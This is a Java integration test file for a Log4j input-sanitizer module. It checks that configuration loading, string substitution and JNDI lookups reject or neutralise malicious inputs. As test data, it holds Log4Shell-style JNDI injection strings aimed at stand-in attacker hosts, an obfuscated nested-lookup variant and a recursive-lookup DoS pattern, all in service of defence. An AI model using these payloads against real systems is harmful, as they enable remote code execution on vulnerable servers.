/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to you under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.logging.log4j.core.its;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.InputStream;
import java.net.URI;
import java.util.HashMap;
import java.util.Map;
import javax.naming.NamingException;
import org.apache.log4j.config.Log4j1ConfigurationFactory;
import org.apache.log4j.config.Log4j1ConfigurationParser;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.ConfigurationException;
import org.apache.logging.log4j.core.config.ConfigurationSource;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.apache.logging.log4j.core.lookup.Interpolator;
import org.apache.logging.log4j.core.lookup.PropertiesLookup;
import org.apache.logging.log4j.core.lookup.StrLookup;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;
import org.apache.logging.log4j.core.net.JndiManager;
import org.apache.logging.log4j.core.test.jndi.SimpleNamingContextBuilder;
import org.apache.logging.log4j.core.test.junit.Tags;
import org.apache.logging.log4j.trustgate.DefaultInputSanitizer;
import org.apache.logging.log4j.trustgate.TrustGateException;
import org.apache.logging.log4j.trustgate.spi.InputSanitizer;
import org.apache.logging.log4j.trustgate.spi.InputType;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Cross-module TrustGate integration coverage (WO-061).
 */
@Tag(Tags.INTEGRATION_TESTS)
class TrustGateIntegrationTest {

    private static final String CONFIG = "log4j2-trustgate-it.xml";
    private static final String TESTKEY = "TrustGateIntegrationTestKey";
    private static final String TESTVAL = "TrustGateIntegrationTestValue";
    private static final String STRICTNESS_PROPERTY = "log4j2.trustgate.strictness";
    private static final String STRICT_PROPERTY = "log4j2.trustgate.strict";
    private static final String JNDI_LOOKUP_PROPERTY = "log4j2.enableJndiLookup";

    private String previousStrictnessProperty;
    private String previousStrictProperty;
    private String previousJndiLookupProperty;
    private LoggerContext loggerContext;

    @BeforeEach
    void setUp() {
        previousStrictnessProperty = System.getProperty(STRICTNESS_PROPERTY);
        previousStrictProperty = System.getProperty(STRICT_PROPERTY);
        previousJndiLookupProperty = System.getProperty(JNDI_LOOKUP_PROPERTY);
        System.clearProperty(STRICTNESS_PROPERTY);
        System.clearProperty(STRICT_PROPERTY);
        System.setProperty(TESTKEY, TESTVAL);
    }

    @AfterEach
    void tearDown() {
        if (loggerContext != null) {
            Configurator.shutdown(loggerContext);
            loggerContext = null;
        }
        restoreProperty(STRICTNESS_PROPERTY, previousStrictnessProperty);
        restoreProperty(STRICT_PROPERTY, previousStrictProperty);
        restoreProperty(JNDI_LOOKUP_PROPERTY, previousJndiLookupProperty);
        System.clearProperty(TESTKEY);
    }

    @Test
    void coreConfigurationSourceRejectsRemoteConfigurationUri() {
        final URI ldapUri = URI.create("ldap://evil.example/cn=config");
        final ConfigurationException exception =
                assertThrows(ConfigurationException.class, () -> ConfigurationSource.fromUri(ldapUri));
        assertTrue(exception.getMessage().contains("ldap"));
    }

    @Test
    void coreConfigurationSourceRejectsFtpConfigurationUri() {
        final URI ftpUri = URI.create("ftp://example.com/log4j2.xml");
        final ConfigurationException exception =
                assertThrows(ConfigurationException.class, () -> ConfigurationSource.fromUri(ftpUri));
        assertTrue(exception.getMessage().contains("ftp"));
    }

    @Test
    void configurationSubstitutorResolvesSafeLookupAndLeavesAttackPatternsLiteral() {
        loggerContext = Configurator.initialize(null, CONFIG);
        final Configuration configuration = loggerContext.getConfiguration();
        assertEquals(TESTVAL, configuration.getStrSubstitutor().replace("${sys:" + TESTKEY + "}"));

        final String attackPattern = "${jndi:ldap://attacker.example/a}";
        assertEquals(attackPattern, configuration.getStrSubstitutor().replace(attackPattern));
    }

    @ParameterizedTest
    @ValueSource(
            strings = {
                "${jndi:ldap://attacker.example/a}",
                "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker/a}"
            })
    void strSubstitutorLeavesMaliciousLookupPatternsLiteral(final String pattern) {
        final StrSubstitutor substitutor = createSubstitutor();
        assertEquals(pattern, substitutor.replace(pattern));
    }

    @Test
    void sanitizerRejectsRecursiveLookupDoSPattern() {
        assertThrows(
                TrustGateException.class,
                () -> new DefaultInputSanitizer()
                        .validate("${${::-${::-$${::-j}}}}", InputType.LOOKUP_PATTERN));
    }

    @ParameterizedTest
    @ValueSource(
            strings = {
                "ldap://attacker.example/a",
                "ldaps://attacker.example/a",
                "rmi://attacker.example/a",
                "dns://attacker.example/a"
            })
    void jndiManagerRejectsMaliciousLookupPatterns(final String pattern) throws Exception {
        assertThrows(
                TrustGateException.class,
                () -> new DefaultInputSanitizer().validate(pattern, InputType.JNDI_LOOKUP),
                pattern);

        System.setProperty(JNDI_LOOKUP_PROPERTY, "true");
        SimpleNamingContextBuilder.emptyActivatedContextBuilder();
        try (JndiManager manager = JndiManager.getDefaultManager()) {
            try {
                assertNull(manager.lookup(pattern), pattern);
            } catch (final NamingException ex) {
                assertInstanceOf(TrustGateException.class, ex.getRootCause(), pattern);
            }
        }
    }

    @Test
    void log4j1BridgeLoadsValidProperties() throws Exception {
        try (InputStream input = resourceStream("trustgate/valid-log4j.properties")) {
            final BuiltConfiguration built =
                    new Log4j1ConfigurationParser().buildConfigurationBuilder(input).build();
            built.initialize();
            final Configuration configuration = built;
            assertEquals(Level.INFO, configuration.getRootLogger().getLevel());
            assertNotNull(configuration.getAppender("Console"));
            configuration.stop();
        }
    }

    @Test
    void log4j1BridgeRejectsMaliciousPropertyKeyAndUriValue() throws Exception {
        try (InputStream input = resourceStream("trustgate/malicious-log4j.properties")) {
            final BuiltConfiguration built =
                    new Log4j1ConfigurationParser().buildConfigurationBuilder(input).build();
            built.initialize();
            final Configuration configuration = built;
            assertNull(configuration.getProperties().get("custom%key"));
            assertNotEquals("ldap://evil.example.com/exploit", configuration.getProperties().get("deployment.url"));
            assertNotNull(configuration.getAppender("Console"));
            configuration.stop();
        }
    }

    @Test
    void log4j1FactoryLoadsValidPropertiesFromClasspath() {
        final URI configLocation = resourceUri("trustgate/valid-log4j.properties");
        final Configuration configuration =
                new Log4j1ConfigurationFactory().getConfiguration(null, "trustgate-it", configLocation);
        assertNotNull(configuration);
        try {
            configuration.start();
            assertEquals(Level.INFO, configuration.getRootLogger().getLevel());
            assertInstanceOf(ConsoleAppender.class, configuration.getAppender("Console"));
        } finally {
            configuration.stop();
        }
    }

    @Test
    void permissiveStrictPropertyDisablesSanitizerValidation() {
        System.setProperty(STRICT_PROPERTY, "false");
        final InputSanitizer sanitizer = new DefaultInputSanitizer();
        assertFalse(sanitizer.isEnabled());
        assertTrue(sanitizer.validate("${jndi:ldap://attacker.example/a}", InputType.LOOKUP_PATTERN).isValid());
    }

    @Test
    void permissiveModeAllowsLookupPatternsButInlineJndiDefenseStillBlocksRemoteSchemes() throws Exception {
        System.setProperty(STRICTNESS_PROPERTY, "permissive");
        System.setProperty(JNDI_LOOKUP_PROPERTY, "true");
        SimpleNamingContextBuilder.emptyActivatedContextBuilder();
        try (JndiManager manager = JndiManager.getDefaultManager()) {
            assertNull(manager.lookup("ldap://attacker.example/jdbc/datasource"));
        }
    }

    private static StrSubstitutor createSubstitutor() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new PropertiesLookup(map));
        return new StrSubstitutor(lookup);
    }

    private static InputStream resourceStream(final String resource) {
        final InputStream input = TrustGateIntegrationTest.class.getClassLoader().getResourceAsStream(resource);
        assertNotNull(input, resource);
        return input;
    }

    private static URI resourceUri(final String resource) {
        final java.net.URL url = TrustGateIntegrationTest.class.getClassLoader().getResource(resource);
        assertNotNull(url, resource);
        try {
            return url.toURI();
        } catch (final java.net.URISyntaxException ex) {
            throw new IllegalStateException(resource, ex);
        }
    }

    private static void restoreProperty(final String name, final String value) {
        if (value == null) {
            System.clearProperty(name);
        } else {
            System.setProperty(name, value);
        }
    }
}
